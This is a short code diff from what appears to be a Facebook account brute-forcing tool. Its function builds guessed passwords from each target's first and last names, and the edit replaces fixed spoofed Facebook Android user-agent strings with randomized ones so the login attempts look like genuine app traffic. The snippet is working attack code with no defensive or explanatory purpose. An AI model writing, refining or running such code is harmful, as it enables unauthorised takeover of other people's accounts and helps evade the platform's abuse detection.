@@ -484,7 +484,7 @@ def M_file_1(ids,names,passlist):
                                 
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                                u1a ="[FBAN/FB4A;FBAV/627.0.0.29.112;FBBV/64021587;FBLC/fr_FR;FBCR/Orange;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/14 Pro;FBSV/14;FBCA/arm64-v8a;FBDM/{density=3.2,width=1440,height=3200}:"+"[FBAN/FB4A;FBAV/627.0.0.29.112;FBBV/64021587;FBLC/ar_SA;FBCR/STC;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/12;FBSV/14;FBCA/arm64-v8a;FBDM/{density=2.9,width=1440,height=3168};]"+"[FBAN/FB4A;FBAV/630.0.0.18.108;FBBV/64518923;FBLC/fr_FR;FBCR/Orange;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/P60 Art;FBSV/12;FBCA/arm64-v8a;FBDM/{density=2.6,width=1224,height=2700};]"
+                                u1a ="[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/Orca-Android;FBAV/896.0.0.42.456;FBPN/com.facebook.orca;FBLC/en_US;FBBV/895837108;FBCR/Satcom;FBMF/samsung;FBBD/samsung;FBDV/SM-T561|KTU84P;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=877,height=1390};FB_FW/1;FBRV/895837108]"
 						
 
                                 device_id = str(uuid.uuid4())
